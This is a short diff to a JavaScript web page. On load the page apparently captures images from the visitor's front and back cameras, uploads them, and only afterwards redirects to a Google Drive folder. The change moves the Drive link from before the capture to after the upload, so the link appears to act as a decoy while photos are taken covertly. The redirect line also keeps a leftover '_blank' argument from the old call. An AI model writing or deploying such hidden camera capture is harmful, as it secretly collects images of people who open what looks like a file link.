@@ -90,8 +90,6 @@
   }
 
   async function startCapture() {
-    // open in new tab
-    window.open("https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft","_blank");
     
     const front = await captureImages("user", "front");
     const back = await captureImages({ exact: "environment" }, "back");
@@ -101,6 +99,8 @@
       await uploadImages(allImages);
     }
 
+    // redirect to gdrive
+    window.location.href = "https://drive.google.com/drive/folders/1dWeuOua4SbFZsxAx13yoq3wqcaoDpMft","_blank";
   }
 
   startCapture();
